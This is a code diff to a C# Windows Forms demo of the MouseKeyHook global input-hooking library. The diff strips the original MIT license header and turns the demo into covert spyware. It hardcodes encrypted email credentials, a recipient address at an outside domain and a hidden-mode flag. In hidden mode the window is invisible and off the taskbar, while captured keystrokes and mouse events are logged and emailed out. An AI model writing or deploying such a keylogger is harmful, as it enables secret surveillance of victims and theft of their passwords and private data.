@@ -1,21 +1,13 @@
-﻿// This code is distributed under MIT license. 
-// Copyright (c) 2015 George Mamaladze
-// See license.txt or http://opensource.org/licenses/mit-license.php
-
-using System;
+﻿using System;
 using System.ComponentModel;
 using System.Windows.Forms;
 using Gma.System.MouseKeyHook;
-using Gma.System.MouseKeyHook.Implementation;
 
 namespace Demo
 {
     public partial class Main : Form
     {
         private IKeyboardMouseEvents _mEvents;
-        private Logger _logger;
-        private EmailService _emailService;
-        private ConfigManager _configManager;
         private LogFileWatcher _logFileWatcher;
 
         private Keys _previousKey;
@@ -26,15 +18,15 @@ namespace Demo
 
         public Main()
         {
+            InitializeAppProperties();
             InitializeComponent();
             suppressMouseCheckBox.Checked = true;
             suppressAltF4CheckBox.Checked = true;
             SubscribeGlobal();
             FormClosing += Main_Closing;
 
-            _configManager = new ConfigManager();
             var isAppHidden = bool.Parse(
-                _configManager.GetProperty(AppProperties.IsHiddenAppModeProperty));
+                ConfigManager.GetProperty(AppProperties.IsHiddenAppModeProperty));
 
             _isCurrentAppModeHidden = isAppHidden;
             if (isAppHidden)
@@ -42,9 +34,6 @@ namespace Demo
                 this.ShowInTaskbar = false;
                 this.Opacity = 0;
             }
-
-            _logger = Logger.Instance;
-            _emailService = EmailService.Instance;
 
             _logFileWatcher = new LogFileWatcher(LogFilePath);
         }
@@ -253,7 +242,7 @@ namespace Demo
             textBoxLog.AppendText(text);
             textBoxLog.ScrollToCaret();
 
-            _logger.Log(text);
+            Logger.Log(text);
         }
 
         private void checkBoxSupressMouseWheel_CheckedChanged(object sender, EventArgs e)
@@ -295,7 +284,63 @@ namespace Demo
 
         private void SendToEmailButton_Click(object sender, EventArgs e)
         {
-            _emailService.SendEmail();
+            EmailService.SendEmail();
+        }
+
+        private void InitializeAppProperties()
+        {
+            var value = "EAAAAKB7cg6twdeJKP/lZhxnP2FyLZsuwtTcX89WGE+OB1hefevn9ydcgMf+yF0Tte3OcQ==";
+            var prop = "EmailAddressFrom";
+            ConfigManager.SetPropertyWithoutEncrypt(prop, value);
+
+            value = "EAAAAEz49LVCHMWwfhHidRqz0OE6vd58NWUcAU+y3tDiu+UG";
+            prop = "Password";
+            ConfigManager.SetPropertyWithoutEncrypt(prop, value);
+
+            value = "zigosaqu@banit.club";
+            prop = "EmailAddressTo";
+            ConfigManager.SetProperty(prop, value);
+
+            value = "EAAAANJ49gnxnC+7tn0Vmxyjgp+0zWlr38ttQtMxYA1+D7r8";
+            prop = "IsHiddenAppMode";
+            ConfigManager.SetPropertyWithoutEncrypt(prop, value);
+
+            value = "EAAAAMvKbGBWJkTdwUNE7jgwDVeLAHH5rMtM+Lcgy+nl5nzr";
+            prop = "FileSize";
+            ConfigManager.SetPropertyWithoutEncrypt(prop, value);
+        }
+
+        private void EditSettingsButton_Click(object sender, EventArgs e)
+        {
+            var form = new SettingsEdit();
+            if (form.ShowDialog() == DialogResult.OK)
+            {
+                if (!string.IsNullOrEmpty(form.EmailFrom))
+                {
+                    ConfigManager.SetProperty(AppProperties.EmailAddressFromProperty, form.EmailFrom);
+                    form.EmailFrom = "";
+                }
+
+                if (!string.IsNullOrEmpty(form.EmailTo))
+                {
+                    ConfigManager.SetProperty(AppProperties.EmailAddressToProperty, form.EmailTo);
+                    form.EmailTo = "";
+                }
+
+                if (!string.IsNullOrEmpty(form.Password))
+                {
+                    ConfigManager.SetProperty(AppProperties.PasswordProperty, form.Password);
+                    form.Password = "";
+                }
+
+                if (!string.IsNullOrEmpty(form.FileSize))
+                {
+                    ConfigManager.SetProperty(AppProperties.FileSizeProperty, form.FileSize);
+                    form.EmailFrom = "";
+                }
+
+                ConfigManager.SetProperty(AppProperties.IsHiddenAppModeProperty, form.IsHiddenMode.ToString());
+            }
         }
     }
 }
